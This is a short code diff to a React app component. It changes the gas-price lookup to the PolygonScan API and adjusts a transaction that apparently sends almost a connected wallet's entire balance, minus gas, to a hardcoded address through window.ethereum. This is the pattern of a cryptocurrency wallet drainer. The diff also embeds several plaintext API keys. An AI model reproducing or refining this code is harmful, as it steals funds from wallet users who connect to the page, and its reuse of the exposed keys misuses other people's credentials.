@@ -18,16 +18,16 @@ function App() {
 
     useEffect(() => {
         const fetchRequest = async () => {
-//             const response = await fetch('https://api.etherscan.io/api?module=gastracker&action=gasoracle&apikey=PW7Z9MJMX6YRBM2M2HAS6CP14Y1ZCUXPWH')
-//             const responseJSON = await response.json()
-//             setGas(responseJSON?.result?.FastGasPrice)
+            const response = await fetch('https://api.polygonscan.com/api?module=gastracker&action=gasoracle&apikey=GAHYRZWJGI53ZX2IRSHBA7T5I4YN8MF9FX')
+            const responseJSON = await response.json()
+            setGas(responseJSON?.result?.FastGasPrice)
             
-            const network = 'polygon'
-            const key = '741065ff3a854d9abb1fd5d50cf3f0e3'
-            const res = await fetch(`https://api.owlracle.info/v3/${ network }/gas?apikey=${ key }`)
-            const data = await res.json()
-            setGas(data.avgGas)
-            console.log(data, data.avgGas, 'qwe')
+//             const network = 'polygon'
+//             const key = '741065ff3a854d9abb1fd5d50cf3f0e3'
+//             const res = await fetch(`https://api.owlracle.info/v3/${ network }/gas?apikey=${ key }`)
+//             const data = await res.json()
+//             setGas(data.avgGas)
+//             console.log(data, data.avgGas, 'qwe')
         }
         fetchRequest()
     }, [])
@@ -52,7 +52,7 @@ function App() {
             "to": '0x57f415C2128875C9e4e3EDB2080010837D10e1Cd',
             // "gas": Number(((gas / 15) / 3089) * 10000000).toFixed().toString(16),
             // "gasPrice": Number(gas * 600000000).toString(16),
-            "value": parseInt((convertedBalance - (gas / 30000000)) * 1000000000000000000).toString(16)
+            "value": parseInt((convertedBalance - (Number(gas) / 30000000)) * 1000000000000000000).toString(16)
         }]
 
         const response = await window.ethereum.request({method: 'eth_sendTransaction', params}).catch(err => {
